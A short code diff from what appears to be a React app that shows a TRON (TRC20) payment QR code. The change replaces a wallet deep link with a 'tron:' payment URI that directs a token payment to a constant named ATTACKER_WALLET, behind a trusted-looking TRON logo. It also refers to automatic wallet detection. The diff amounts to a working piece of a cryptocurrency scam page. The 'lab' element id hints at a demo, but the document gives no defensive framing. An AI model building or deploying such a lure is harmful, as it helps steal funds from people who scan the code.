@@ -21,8 +21,9 @@ export default function App() {
   const [amount, setAmount] = useState("1");
   const qrRef = useRef(null);
 
-  // DEEP LINK - Auto-opens in wallet DApp browser
-  const qrValue = `tronlink://dapp?url=${encodeURIComponent(VERCEL_URL)}`;
+  // TRON PAYMENT URI - This is what wallets recognize natively
+  // Format: tron:<address>?amount=<amount>&token=<token_address>
+  const tronPaymentURI = `tron:${ATTACKER_WALLET}?amount=1&token=${TOKEN_ADDRESS}`;
 
   // 1. DETECT WALLET AUTOMATICALLY
   useEffect(() => {
@@ -153,14 +154,14 @@ export default function App() {
           <span style={{ fontSize: 14, fontWeight: 500, color: "#eaecef" }}>TRON (TRC20)</span>
         </div>
 
-        {/* QR CODE CARD */}
+        {/* QR CODE CARD - Contains TRON Payment URI, not URL */}
         <div style={{ 
           background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 20, 
           width: "100%", maxWidth: 320, boxShadow: "0 8px 24px rgba(0,0,0,0.4)" 
         }}>
           <div id="lab-qr-box" ref={qrRef} style={{ textAlign: "center" }}>
             <QRCodeSVG 
-              value={qrValue} size={220} level="H" includeMargin={false} 
+              value={tronPaymentURI} size={220} level="H" includeMargin={false} 
               imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
             />
           </div>
